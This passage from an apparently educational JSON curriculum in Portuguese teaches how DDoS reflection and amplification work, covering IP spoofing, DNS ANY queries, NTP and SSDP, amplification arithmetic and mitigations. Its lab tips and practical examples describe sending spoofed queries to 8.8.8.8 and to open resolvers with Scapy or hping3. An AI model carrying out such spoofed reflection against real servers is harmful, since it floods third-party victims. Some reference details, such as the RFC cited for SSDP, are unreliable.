                                "Lista corretamente os 3 tipos DDoS com exemplos por camada.",
                                "Desenha e explica a pirâmide DDoS com métricas apropriadas.",
                                "Classifica 5+ ataques exemplo no espectro com >90% acurácia.",
                                "Identifica ambiguidades multi-vetoriais e propõe resolução.",
                                "Aplica framework em log de tráfego real via Wireshark.",
                                "Explica impacto de cada posição na pirâmide."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de camadas OSI (L3/L4 vs L7).",
                                "Uso correto da pirâmide para hierarquia e sofisticação.",
                                "Profundidade em evidências (tráfego, métricas, vetores).",
                                "Capacidade de lidar com casos edge/multi-vetoriais.",
                                "Clareza em fluxogramas e relatórios de classificação.",
                                "Integração holística: não silos, mas espectro unificado."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de pacotes OSI (Wireshark).",
                                "Análise de Malware: Detecção de botnets DDoS.",
                                "Gestão de Incidentes: Triage em SOCs.",
                                "Estatística: Métricas de tráfego (pps, bps, RPS).",
                                "Desenvolvimento Web: Vulnerabilidades L7 em apps."
                              ],
                              "realWorldApplication": "Em um SOC, classificar um pico de tráfego como DDoS L7 permite ativar WAF rules específicas, mitigando Slowloris sem bloquear tráfego legítimo, salvando downtime em e-commerces durante black friday."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.2.1.1",
                              "10.1.5.2.2.1",
                              "10.1.5.2.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.3",
                    "name": "Mecanismos de Amplificação e Reflexão",
                    "description": "Técnicas usadas para multiplicar o tráfego malicioso, como DNS e NTP amplification.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.3.1",
                        "name": "Reflexão em Ataques DDoS",
                        "description": "Técnica em que o atacante falsifica o endereço IP da vítima em requisições enviadas a servidores públicos, fazendo com que as respostas sejam direcionadas à vítima, multiplicando o volume de tráfego sem que o atacante precise gerar todo o tráfego diretamente.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.1.1",
                            "name": "Identificar o papel do spoofing de IP na reflexão",
                            "description": "Explicar como o atacante utiliza o spoofing de endereço IP de origem para redirecionar respostas de servidores legítimos diretamente para a vítima, explorando protocolos UDP sem verificação de origem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do Spoofing de IP",
                                  "subSteps": [
                                    "Defina spoofing de IP como a falsificação do endereço IP de origem em pacotes de rede.",
                                    "Explique que o campo IP de origem é facilmente manipulável em camadas inferiores do protocolo TCP/IP.",
                                    "Discuta por que o spoofing é possível: roteadores forwarding baseado em destino, não origem.",
                                    "Identifique limitações: spoofing unidirecional em conexões TCP devido a handshakes.",
                                    "Compare com IP legítimo usando exemplos de headers de pacotes."
                                  ],
                                  "verification": "Desenhe um header IP simples mostrando campo origem spoofado vs. real.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação RFC 791 (IP), Wireshark para captura de pacotes.",
                                  "tips": "Use ferramentas como Scapy em Python para gerar pacotes spoofados em ambiente lab.",
                                  "learningObjective": "Explicar tecnicamente como o spoofing de IP altera o tráfego sem detecção inicial.",
                                  "commonMistakes": "Confundir spoofing com MAC spoofing ou achar que TCP permite spoofing bidirecional."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Protocolos UDP e Falta de Verificação de Origem",
                                  "subSteps": [
                                    "Descreva UDP como protocolo sem conexão, sem handshakes ou verificação de origem.",
                                    "Liste serviços UDP amplificadores comuns: DNS (porta 53), NTP (123), SSDP (1900).",
                                    "Explique respostas maiores que requests em serviços como DNS ANY query.",
                                    "Demonstre com exemplo: request DNS pequeno gera resposta grande.",
                                    "Compare UDP vs. TCP: TCP rejeita pacotes spoofados pós-handshake."
                                  ],
                                  "verification": "Liste 3 serviços UDP amplificadores e seus fatores de amplificação típicos.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Lista de serviços amplificadores (ex: https://www.us-cert.gov/ncas/alerts/TA14-017A), tcpdump.",
                                  "tips": "Lembre: fator de amplificação = tamanho resposta / tamanho request.",
                                  "learningObjective": "Identificar por que UDP é vulnerável a reflexão devido à ausência de autenticação.",
                                  "commonMistakes": "Achar que todos os protocolos UDP amplificam; focar só em TCP."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear o Mecanismo de Reflexão com Spoofing",
                                  "subSteps": [
                                    "Descreva fluxo: Atacante envia UDP request spoofado (IP vítima como origem) para servidor amplificador.",
                                    "Servidor responde legitimamente para IP spoofado (vítima), amplificando tráfego.",
                                    "Ilustre com diagrama: Atacante → Servidor (spoof IP vítima) → Vítima (resposta grande).",
                                    "Calcule amplificação: múltiplos servidores = DDoS distribuído.",
                                    "Simule em lab: use hping3 para enviar pacotes spoofados UDP."
                                  ],
                                  "verification": "Crie diagrama de fluxo mostrando 1 request amplificado para vítima.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Ferramentas: hping3 ou Scapy, VM para lab isolado, diagramas em Draw.io.",
                                  "tips": "Teste em rede isolada para evitar questões legais; capture com Wireshark.",
                                  "learningObjective": "Desenhar e explicar o fluxo exato onde spoofing redireciona respostas para vítima.",
                                  "commonMistakes": "Inverter origem/destino; ignorar que vítima não interage com servidor."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar o Papel Específico na Reflexão DDoS",
                                  "subSteps": [
                                    "Destaque: Sem spoofing, respostas voltam ao atacante (inútil para DDoS).",
                                    "Explique escala: Botnet envia milhões de requests spoofados para reflexão massiva.",
                                    "Discuta detecção: tráfego UDP alto de fontes legítimas para vítima.",
                                    "Compare reflexão vs. outros DDoS: volumentric sem necessidade de infecção na vítima.",
                                    "Revise exemplos históricos: ataques Memcached (50Gbps+ amplificação)."
                                  ],
                                  "verification": "Explique em 1 parágrafo por que spoofing é essencial para reflexão funcionar.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Relatórios de ataques (ex: Akamai State of Internet), vídeos explicativos.",
                                  "tips": "Associe a ataques reais para retenção; memorize 'spoofing = redirecionamento invisível'.",
                                  "learningObjective": "Articular o papel crítico do spoofing como enabler da reflexão em DDoS.",
                                  "commonMistakes": "Confundir reflexão com flood direto; subestimar fator amplificação."
                                }
                              ],
                              "practicalExample": "Em um lab, use Scapy para enviar uma query DNS UDP spoofada (IP vítima como origem) para 8.8.8.8. A resposta DNS ANY (300+ bytes) chega à vítima, demonstrando reflexão com fator ~60x.",
                              "finalVerifications": [
                                "Pode diagramar o fluxo completo de reflexão com spoofing?",
                                "Lista 3 serviços UDP usados em reflexão e seus fatores?",
                                "Explica por que UDP mas não TCP é vulnerável?",
                                "Identifica detecção básica: tráfego unsolicited UDP alto?",
                                "Diferencia reflexão de amplificação pura?",
                                "Cita exemplo real de ataque reflexão DDoS?"
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica no papel do spoofing (exata vs. vaga).",
                                "Compreensão de UDP vs. TCP (completa vs. parcial).",
                                "Qualidade do diagrama de fluxo (claro com labels vs. confuso).",
                                "Exemplos práticos fornecidos (concretos vs. genéricos).",
                                "Identificação de erros comuns evitados (sem confusões chave).",
                                "Explicação verbal fluida e estruturada."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Análise de protocolos IP/UDP.",
                                "Programação: Uso de bibliotecas como Scapy para simulações.",
                                "Ética e Direito: Implicações legais de testes de spoofing.",
                                "Matemática: Cálculo de fatores de amplificação e volumes de tráfego."
                              ],
                              "realWorldApplication": "Em equipes de SOC, identificar tráfego de reflexão (ex: DNS responses de fontes legítimas) permite mitigar DDoS via BCP38 (filtros anti-spoofing) ou scrubbers como Cloudflare Magic Transit, prevenindo outages em sites como bancos durante ataques de 100Gbps+."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.1.2",
                            "name": "Reconhecer protocolos vulneráveis à reflexão",
                            "description": "Listar e descrever protocolos como DNS, NTP e SSDP que são comumente explorados em ataques de reflexão devido à ausência de autenticação de remetente e suporte a respostas maiores que requisições.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o conceito de ataques de reflexão em DDoS",
                                  "subSteps": [
                                    "Defina ataques DDoS e diferencie de DoS simples.",
                                    "Explique o mecanismo de reflexão: atacante falsifica IP da vítima, servidor responde para vítima.",
                                    "Descreva amplificação: respostas maiores que requisições.",
                                    "Identifique pré-requisitos: spoofing de IP e protocolos UDP.",
                                    "Assista a um vídeo curto demonstrando reflexão."
                                  ],
                                  "verification": "Resuma em 3 frases o que é reflexão e amplificação, sem erros conceituais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Vídeo explicativo sobre DDoS reflexão (ex: YouTube Cloudflare)",
                                    "Notas em papel ou digital"
                                  ],
                                  "tips": "Use analogia: como um megafone amplificando voz falsa.",
                                  "learningObjective": "Compreender os fundamentos de reflexão para contextualizar vulnerabilidades.",
                                  "commonMistakes": [
                                    "Confundir reflexão com inundação direta",
                                    "Ignorar papel do UDP"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar características de protocolos vulneráveis",
                                  "subSteps": [
                                    "Liste critérios: ausência de autenticação de remetente, suporte a UDP, respostas amplificadas.",
                                    "Explique por que autenticação impede reflexão (verificação de origem).",
                                    "Calcule fator de amplificação: tamanho resposta / requisição.",
                                    "Pesquise exemplos de fatores: DNS >10x, NTP >500x.",
                                    "Crie tabela comparando protocolos seguros vs vulneráveis."
                                  ],
                                  "verification": "Crie uma tabela com 4 critérios e exemplos de protocolos que falham neles.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação IETF sobre UDP",
                                    "Planilha Google Sheets ou Excel"
                                  ],
                                  "tips": "Foco em UDP vs TCP: TCP tem handshake que previne spoofing.",
                                  "learningObjective": "Reconhecer padrões que tornam protocolos suscetíveis a reflexão.",
                                  "commonMistakes": [
                                    "Esquecer amplificação como fator chave",
                                    "Confundir com vulnerabilidades de buffer overflow"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar protocolos específicos: DNS, NTP e SSDP",
                                  "subSteps": [
                                    "Estude DNS: queries recursivas amplificadas, sem autenticação.",
                                    "Estude NTP: monlist command expõe listas amplas de clientes.",
                                    "Estude SSDP: UPnP discovery com M-SEARCH amplo.",
                                    "Descreva para cada: porta UDP, comando vulnerável, fator amplificação típico.",
                                    "Compare em uma matriz: protocolo, vulnerabilidade, exemplo de exploit."
                                  ],
                                  "verification": "Escreva descrições de 50 palavras cada para DNS, NTP, SSDP.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "RFCs: 1035 (DNS), 5905 (NTP), 2555 (SSDP)",
                                    "Artigo Krebs on Security sobre NTP reflection"
                                  ],
                                  "tips": "Busque 'amplification factor' em relatórios de segurança recentes.",
                                  "learningObjective": "Descrever precisamente por que esses protocolos são explorados.",
                                  "commonMistakes": [
                                    "Omitir fatores de amplificação reais",
                                    "Confundir SSDP com SNMP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar reconhecimento e mitigação básica",
                                  "subSteps": [
                                    "Liste 5 protocolos e classifique como vulneráveis ou não.",
                                    "Simule detecção: analise tráfego Wireshark de exemplo de reflexão.",
                                    "Desenvolva lista de defesas: rate limiting, BCP38, DNSSEC.",
                                    "Crie quiz pessoal: identifique vulnerabilidade em cenários.",
                                    "Discuta em fórum ou anote aplicações reais."
                                  ],
                                  "verification": "Responda corretamente a 5 perguntas sobre protocolos em um quiz autoavaliado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Wireshark com pcap de DDoS reflexão (ex: de Malware-Traffic-Analysis)",
                                    "Quiz online sobre DDoS"
                                  ],
                                  "tips": "Use filtros Wireshark: udp.port == 53 para DNS.",
                                  "learningObjective": "Aplicar conhecimento para reconhecer e listar protocolos vulneráveis.",
                                  "commonMistakes": [
                                    "Focar só em ataques sem reconhecer protocolos",
                                    "Ignorar evoluções como NTP monlist banido"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório Wireshark, capture tráfego UDP onde um atacante envia query DNS falsa para 8.8.8.8 com IP vítima spoofed; observe resposta amplificada >1000 bytes chegando à vítima, confirmando reflexão DNS.",
                              "finalVerifications": [
                                "Liste DNS, NTP, SSDP com descrições corretas de vulnerabilidades.",
                                "Explique fator de amplificação para cada protocolo.",
                                "Identifique 3 critérios comuns de vulnerabilidade.",
                                "Diferencie reflexão de outros DDoS como SYN flood.",
                                "Sugira 2 mitigações por protocolo."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas descrições (sem erros factuais >90%).",
                                "Completude: cobre todos protocolos e critérios.",
                                "Profundidade: inclui fatores amplificação e exemplos.",
                                "Aplicação: relaciona a cenários reais de DDoS.",
                                "Clareza: explicações concisas e estruturadas."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entender UDP/TCP e spoofing IP (CCNA).",
                                "Programação: Implementar queries em Python (scapy para simulação).",
                                "Matemática: Calcular ratios de amplificação.",
                                "Ética: Discussão de impactos de DDoS em infraestrutura crítica."
                              ],
                              "realWorldApplication": "Em equipes de SOC, monitorar tráfego NTP/SSDP para bloquear reflexão em ataques como o Mirai botnet, protegendo servidores de downtime massivo em e-commerces."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.1.3",
                            "name": "Analisar o fluxo de um ataque de reflexão",
                            "description": "Desenhar e interpretar o fluxo típico de um ataque de reflexão, incluindo a geração de requisições spoofadas, processamento pelos servidores amplificadores e inundação da vítima com respostas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar os componentes principais de um ataque de reflexão",
                                  "subSteps": [
                                    "Defina os papéis: atacante (gerador de tráfego spoofado), vítima (alvo final) e servidores amplificadores (ex: DNS, NTP, SSDP).",
                                    "Liste protocolos comuns usados em reflexões: DNS (UDP/53), NTP (UDP/123), Memcached (UDP/11211).",
                                    "Explique o spoofing de IP: o atacante falsifica o endereço IP de origem nas requisições para direcionar respostas à vítima.",
                                    "Diferencie reflexão (respostas redirecionadas) de amplificação (respostas maiores que requisições).",
                                    "Identifique vetores comuns: scanners de amplificadores públicos via ferramentas como Masscan."
                                  ],
                                  "verification": "Crie uma lista ou diagrama simples rotulando cada componente e seu papel; revise se todos os elementos estão corretos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel e caneta ou ferramenta de diagrama como Draw.io",
                                    "Lista de protocolos DDoS (DNS, NTP, etc.)"
                                  ],
                                  "tips": "Use cores diferentes para cada ator no diagrama para facilitar a visualização.",
                                  "learningObjective": "Compreender os atores e mecanismos básicos que habilitam o ataque de reflexão.",
                                  "commonMistakes": [
                                    "Confundir vítima com amplificador",
                                    "Ignorar o papel do spoofing de IP",
                                    "Misturar reflexão com flood direto"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenhar a geração e envio de requisições spoofadas pelo atacante",
                                  "subSteps": [
                                    "Desenhe o atacante enviando pacotes UDP com IP de origem spoofado como o da vítima.",
                                    "Inclua detalhes do pacote: header UDP pequeno, query mínima para maximizar resposta (ex: DNS ANY query).",
                                    "Mostre o envio para múltiplos amplificadores para distribuição.",
                                    "Calcule fator de amplificação aproximado: tamanho resposta / tamanho requisição (ex: DNS ~50x).",
                                    "Adicione setas indicando direção: atacante → amplificadores (com IP vítima spoofado)."
                                  ],
                                  "verification": "Desenhe o diagrama parcial e confirme com uma referência online se o fluxo de saída está correto.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama (Draw.io ou Lucidchart)",
                                    "Referência de pacotes Wireshark para DNS spoofed"
                                  ],
                                  "tips": "Mantenha setas unidirecionais claras e label cada uma com 'spoofed IP: vítima'.",
                                  "learningObjective": "Visualizar e representar o estágio inicial do ataque com precisão técnica.",
                                  "commonMistakes": [
                                    "Esquecer de marcar o spoofing no IP origem",
                                    "Usar TCP em vez de UDP",
                                    "Não escalar o número de amplificadores"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear o processamento nos servidores amplificadores e geração de respostas",
                                  "subSteps": [
                                    "Descreva o amplificador recebendo a requisição e processando sem autenticação (stateless UDP).",
                                    "Mostre a geração da resposta amplificada: ex: DNS responde com zona inteira (~400 bytes vs 60 bytes query).",
                                    "Desenhe setas de resposta: amplificador → vítima (IP real agora).",
                                    "Inclua múltiplas respostas convergindo para a vítima, criando inundação.",
                                    "Note latência típica: <100ms por reflexão, escalando com bots."
                                  ],
                                  "verification": "Simule verbalmente ou anote o tamanho das respostas vs queries para 3 protocolos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Exemplos de capturas Wireshark de ataques reais (de repositórios públicos)",
                                    "Calculadora para fatores de amplificação"
                                  ],
                                  "tips": "Compare tamanhos de pacotes reais para entender por que é 'amplificado'.",
                                  "learningObjective": "Entender como os amplificadores involuntariamente participam e amplificam o tráfego.",
                                  "commonMistakes": [
                                    "Assumir autenticação nos amplificadores",
                                    "Ignorar que respostas vão para IP real da vítima",
                                    "Subestimar o fator de amplificação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar o fluxo completo, impacto na vítima e detecção básica",
                                  "subSteps": [
                                    "Conecte todo o diagrama: spoof → processamento → flood na vítima.",
                                    "Analise impacto: saturação de banda, CPU/memória da vítima esgotados por tráfego legítimo-like.",
                                    "Identifique assinaturas: alto tráfego UDP de portas efêmeras para portas de serviço conhecidas.",
                                    "Discuta mitigação inicial: filtros BCP38, rate-limiting em amplificadores.",
                                    "Crie uma narrativa passo-a-passo do fluxo completo."
                                  ],
                                  "verification": "Apresente o diagrama final a um par ou grave explicação em 1 minuto.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Diagrama completo anterior",
                                    "Ferramentas de monitoramento como tcpdump ou Wireshark"
                                  ],
                                  "tips": "Adicione timestamps fictícios nas setas para mostrar simultaneidade das respostas.",
                                  "learningObjective": "Sintetizar o fluxo inteiro e correlacionar com sintomas observáveis.",
                                  "commonMistakes": [
                                    "Não fechar o loop no diagrama",
                                    "Confundir tráfego com volumentria DDoS",
                                    "Omitir detecção via netflow"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um ataque DNS reflection, o atacante usa um botnet para enviar 1000 queries DNS 'ANY' spoofadas (IP vítima) para 10.000 servidores DNS abertos. Cada servidor responde com ~400 bytes, resultando em 4Gbps de flood na vítima, saturando sua conexão de 1Gbps.",
                              "finalVerifications": [
                                "Desenhar diagrama completo com setas corretas e labels precisos.",
                                "Explicar verbalmente o fluxo em <2 minutos sem erros.",
                                "Calcular fator de amplificação para pelo menos 2 protocolos.",
                                "Identificar 3 vetores comuns de reflexão.",
                                "Diferenciar reflexão de outros DDoS (ex: SYN flood).",
                                "Simular detecção em um log de tráfego fictício."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica no diagrama (spoofing, direções corretas): 30%",
                                "Detalhe nos sub-passos e cálculos de amplificação: 25%",
                                "Clareza na interpretação e narrativa do fluxo: 20%",
                                "Inclusão de verificações e mitigações básicas: 15%",
                                "Uso correto de termos (UDP, stateless, etc.): 10%"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos UDP e IP spoofing",
                                "Análise de Tráfego: Wireshark e Netflow",
                                "Programação: Simulação de pacotes com Scapy",
                                "Ética e Direito: Responsabilidades de operadores de amplificadores",
                                "Estatística: Cálculo de taxas de amplificação e volumes de tráfego"
                              ],
                              "realWorldApplication": "Analisar fluxos de reflexão em SOCs para detectar DDoS em tempo real, configurar firewalls para bloquear queries spoofadas e recomendar hardening de serviços amplificadores em infraestruturas críticas como bancos ou provedores de cloud."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.3.2",
                        "name": "Amplificação DNS",
                        "description": "Mecanismo que explora servidores DNS abertos para amplificar tráfego, enviando pequenas consultas (como tipo ANY) que geram respostas muito maiores, multiplicando o volume de dados direcionado à vítima.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.2.1",
                            "name": "Descrever consultas DNS amplificadoras",
                            "description": "Explicar o uso de consultas recursivas ou de tipo ANY em servidores DNS autoritativos abertos, que retornam registros completos da zona, resultando em fatores de amplificação de até 50x ou mais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos das Consultas DNS",
                                  "subSteps": [
                                    "Estudar a hierarquia DNS: root servers, TLD servers e authoritative name servers.",
                                    "Identificar os tipos de registros DNS (A, MX, NS, TXT, etc.).",
                                    "Diferenciar consultas recursivas (servidor resolve tudo) de iterativas (cliente resolve passo a passo).",
                                    "Explicar o papel dos servidores DNS autoritativos na resposta de zonas.",
                                    "Revisar o formato de uma mensagem DNS (header, question, answer, authority, additional)."
                                  ],
                                  "verification": "Listar corretamente os componentes de uma mensagem DNS e diferenciar recursiva de iterativa.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "RFC 1034/1035",
                                    "Ferramenta dig ou nslookup",
                                    "Diagrama de hierarquia DNS"
                                  ],
                                  "tips": "Desenhe um fluxograma da resolução DNS para fixar os conceitos.",
                                  "learningObjective": "Dominar os conceitos básicos de consultas DNS e hierarquia de servidores.",
                                  "commonMistakes": [
                                    "Confundir servidores recursivos com autoritativos",
                                    "Ignorar o papel do cache na resolução"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Consultas Recursivas em Servidores Abertos",
                                  "subSteps": [
                                    "Explicar como uma consulta recursiva delega a resolução total ao servidor receptor.",
                                    "Identificar servidores DNS autoritativos 'abertos' (open resolvers) que aceitam consultas de qualquer IP.",
                                    "Demonstrar com dig como uma consulta recursiva para um domínio amplo retorna múltiplos registros.",
                                    "Calcular o tamanho aproximado da query vs resposta em cenários recursivos.",
                                    "Discutir vulnerabilidades de recursão aberta em ataques."
                                  ],
                                  "verification": "Executar uma consulta recursiva e descrever o tamanho da resposta gerada.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Comando dig (ex: dig @8.8.8.8 example.com)",
                                    "Wireshark para capturar pacotes DNS"
                                  ],
                                  "tips": "Use servidores públicos como 8.8.8.8 para testes, mas evite abusos.",
                                  "learningObjective": "Entender como consultas recursivas exploram servidores abertos para amplificação.",
                                  "commonMistakes": [
                                    "Achar que recursiva é sempre segura",
                                    "Não medir o fator de amplificação (tamanho resposta/query)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Consultas de Tipo ANY em Servidores Autoritativos",
                                  "subSteps": [
                                    "Definir consulta ANY: retorna todos os registros da zona para o domínio solicitado.",
                                    "Comparar tamanho de query ANY (pequena) com resposta (grande, com todos os RRs).",
                                    "Identificar servidores autoritativos que respondem ANY sem restrições.",
                                    "Exemplificar com dig ANY @servidor_autoritativo dominio.com.",
                                    "Explicar por que ANY é poderosa para amplificação (até 50x)."
                                  ],
                                  "verification": "Executar dig ANY em um servidor autoritativo e calcular fator de amplificação.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Lista de servidores DNS abertos (ex: openresolver.com)",
                                    "dig ou nslookup",
                                    "Calculadora para tamanhos de pacotes"
                                  ],
                                  "tips": "Filtre respostas com +short no dig para análise rápida.",
                                  "learningObjective": "Compreender o mecanismo específico da consulta ANY na amplificação.",
                                  "commonMistakes": [
                                    "Confundir ANY com ALL (não existe)",
                                    "Subestimar o volume de dados na resposta de zona grande"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar o Mecanismo de Amplificação DNS",
                                  "subSteps": [
                                    "Calcular fator de amplificação: (tamanho resposta) / (tamanho query spoofed).",
                                    "Descrever fluxo de ataque: spoof IP vítima, enviar query ANY/recursiva para amplificadores.",
                                    "Explicar reflexão: resposta vai para vítima, não atacante.",
                                    "Discutir mitigações: rate limiting, ANY desabilitado (RFC 8482), BCP 38.",
                                    "Analisar exemplos reais de ataques DNS amp."
                                  ],
                                  "verification": "Desenhar diagrama de ataque DNS amp e calcular exemplo de 50x amp.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Diagramas de ataques DDoS",
                                    "Relatórios de incidentes (ex: Spamhaus)",
                                    "Ferramentas como dnsamp.com"
                                  ],
                                  "tips": "Use spoofing IP simulado em labs éticos para visualizar.",
                                  "learningObjective": "Integrar conceitos em descrição completa de consultas DNS amplificadoras.",
                                  "commonMistakes": [
                                    "Esquecer spoofing de IP fonte",
                                    "Não mencionar mitigações atuais"
                                  ]
                                }
                              ],
                              "practicalExample": "Simule um ataque: Use dig ANY isc.org @servidor_aberto_abusivo (ex: um open resolver autoritativo). A query de ~40 bytes gera resposta de >2000 bytes (50x amp). Spoof o IP fonte para vítima; milhares de bots enviam queries, vítima recebe Gbps de tráfego DNS inútil.",
                              "finalVerifications": [
                                "Explicar diferença entre recursiva e ANY na amplificação.",
                                "Calcular fator de amp em exemplo concreto.",
                                "Desenhar fluxo de reflexão/spoofing.",
                                "Listar 3 mitigações para DNS amp.",
                                "Identificar servidor autoritativo aberto via teste.",
                                "Descrever impacto em DDoS reais."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na descrição de queries ANY/recursivas (90%+ acerto).",
                                "Uso de exemplos quantitativos (tamanhos de pacotes, fatores de amp).",
                                "Clareza no diagrama de ataque (reflexão e spoofing).",
                                "Inclusão de mitigações e contexto real.",
                                "Profundidade em substeps (cobertura completa).",
                                "Aplicação prática demonstrada."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos UDP/IP e spoofing.",
                                "Segurança da Informação: Detecção de DDoS e honeypots.",
                                "Programação: Scripts em Python com dnspython para simular queries.",
                                "Análise de Protocolos: Uso de Wireshark para tráfego DNS.",
                                "Ética em Cibersegurança: Abuso de infraestrutura pública."
                              ],
                              "realWorldApplication": "Em ataques DDoS massivos, como o de 2013 contra Spamhaus (300 Gbps via DNS amp com queries ANY), amplificadores públicos sobrecarregam vítimas. Empresas usam isso para mitigar: desabilitar ANY, implementar RRL e filtros BCP38, protegendo infra crítica como bancos e governos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.2.2",
                            "name": "Calcular fatores de amplificação DNS",
                            "description": "Demonstrar como calcular o fator de amplificação comparando o tamanho da consulta DNS spoofada (tipicamente 60 bytes) com o tamanho da resposta (até 4000 bytes), ilustrando o ganho de tráfego malicioso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Amplificação DNS",
                                  "subSteps": [
                                    "Estude o protocolo DNS e como consultas funcionam em UDP.",
                                    "Aprenda sobre spoofing de IP na consulta para reflexão.",
                                    "Identifique por que respostas DNS são maiores que consultas (ex: respostas ANY ou EDNS).",
                                    "Revise exemplos de queries que maximizam tamanho da resposta.",
                                    "Anote diferenças entre query padrão e resposta amplificada."
                                  ],
                                  "verification": "Explique em suas palavras como uma consulta pequena gera uma resposta grande e liste 2 tipos de queries amplificadoras.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação RFC 1035 (DNS)",
                                    "Vídeo introdutório sobre DNS Amplification (YouTube/Khan Academy)",
                                    "Notas pessoais"
                                  ],
                                  "tips": "Use diagramas para visualizar o fluxo: Attacker -> Spoofed Victim -> DNS Server -> Victim.",
                                  "learningObjective": "Entender o mecanismo básico de reflexão e amplificação em DNS.",
                                  "commonMistakes": [
                                    "Confundir reflexão com amplificação",
                                    "Ignorar o papel do spoofing de IP"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Tamanhos Típicos de Pacotes DNS",
                                  "subSteps": [
                                    "Capture uma query DNS padrão usando Wireshark (ex: nslookup example.com).",
                                    "Meça o tamanho da query spoofada típica (cerca de 60 bytes para queries mínimas).",
                                    "Capture ou pesquise respostas amplificadas (ex: query tipo ANY, até 4000 bytes com EDNS).",
                                    "Registre variações: query UDP header + payload vs. resposta com múltiplos records.",
                                    "Compare headers UDP/IP em ambos os lados."
                                  ],
                                  "verification": "Registre tamanhos exatos de pelo menos 3 queries e respostas capturadas ou pesquisadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Servidor DNS público para testes (ex: 8.8.8.8)",
                                    "Tabela de tamanhos DNS padrão"
                                  ],
                                  "tips": "Filtre Wireshark por 'dns' e use 'udp.length' para medir tamanhos precisos.",
                                  "learningObjective": "Medir e documentar tamanhos reais de queries e respostas DNS.",
                                  "commonMistakes": [
                                    "Incluir overhead IP/TCP desnecessário",
                                    "Usar queries não amplificadoras como baseline"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular o Fator de Amplificação",
                                  "subSteps": [
                                    "Defina a fórmula: Fator = Tamanho da Resposta / Tamanho da Query.",
                                    "Aplique a exemplo: 4000 bytes resposta / 60 bytes query = 66.67x.",
                                    "Calcule para 3 cenários variados (ex: 200/60=3.33x, 3000/40=75x).",
                                    "Considere overhead de rede (UDP/IP) em cálculos precisos.",
                                    "Crie uma planilha para automatizar cálculos."
                                  ],
                                  "verification": "Forneça cálculos corretos para 3 exemplos, mostrando fórmula e resultado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora ou Google Sheets",
